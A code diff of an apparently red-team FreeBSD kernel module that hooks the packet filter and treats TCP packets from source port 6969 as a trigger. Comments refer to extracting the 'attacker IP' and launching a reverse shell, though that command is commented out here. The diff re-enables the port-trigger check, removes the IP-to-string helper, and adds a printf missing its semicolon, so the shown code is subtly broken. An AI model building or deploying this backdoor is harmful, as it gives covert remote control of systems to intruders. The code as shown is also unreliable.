@@ -31,32 +31,10 @@ static pfil_hook_t g_hook  = NULL;
 
 
 
-// Helper function to convert an integer (0-255) to a string
-static int int_to_str(int num, char *buffer) {
-    char temp[4];  // Max value 255 (3 digits + '\0')
-    int i = 0, j = 0;
-
-    // Convert number to string in reverse order
-    do {
-        temp[i++] = '0' + (num % 10);
-        num /= 10;
-    } while (num > 0);
-
-    // Reverse string into buffer
-    while (i > 0) {
-        buffer[j++] = temp[--i];
-    }
-
-    buffer[j] = '\0';  // Null-terminate
-    return j;  // Return length of written string
-}
-
-
-
 static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
     struct mbuf *m = *mp;
     struct ip *ip_header;
-    // struct tcphdr *tcp_header;
+    struct tcphdr *tcp_header;
 
     // Ensure mbuf is valid
     if (m == NULL) return PFIL_PASS;;
@@ -72,36 +50,22 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     // Check if it's a TCP packet
     if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;
 
-    // // Extract the TCP header
-    // tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
-    // // Check source port
-    // if (ntohs(tcp_header->th_sport) != TRIGGER_PORT) return PFIL_PASS;;
+    // Extract the TCP header
+    tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
+    // Check source port
+    if (ntohs(tcp_header->th_sport) != TRIGGER_PORT) return PFIL_PASS;;
 
-    // // Ensure there's enough data for TCP header
-    // if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
-    //     m = m_pullup(m, (ip_header->ip_hl << 2) + sizeof(struct tcphdr));
-    //     if (m == NULL) return PFIL_PASS;;
-    // }
+    // Ensure there's enough data for TCP header
+    if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
+        m = m_pullup(m, (ip_header->ip_hl << 2) + sizeof(struct tcphdr));
+        if (m == NULL) return PFIL_PASS;;
+    }
 
 
 
     // now we know the packet is a red-team packet
     // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
-    char attacker_ip_str[16];  // Max IPv4 string size: "255.255.255.255" + '\0'
-    unsigned int ip = ntohl(ip_header->ip_src.s_addr);
 
-    // Manually convert integer IP to string
-    int i = 0;
-    i += int_to_str((ip >> 24) & 0xFF, &attacker_ip_str[i]); // First octet
-    attacker_ip_str[i++] = '.';
-    i += int_to_str((ip >> 16) & 0xFF, &attacker_ip_str[i]); // Second octet
-    attacker_ip_str[i++] = '.';
-    i += int_to_str((ip >> 8) & 0xFF, &attacker_ip_str[i]);  // Third octet
-    attacker_ip_str[i++] = '.';
-    i += int_to_str(ip & 0xFF, &attacker_ip_str[i]);         // Fourth octet
-    attacker_ip_str[i] = '\0';  // Null-terminate the string
-
-    printf("[LKM] Extracted Attacker IP: %s\n", attacker_ip_str);
 
     // Construct the reverse shell command
     // char reverse_shell_cmd[100];
@@ -110,7 +74,7 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
    
     //printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
-    
+    printf("Packet with source port 6969 detected!!\n")
     return PFIL_PASS;
 
 }
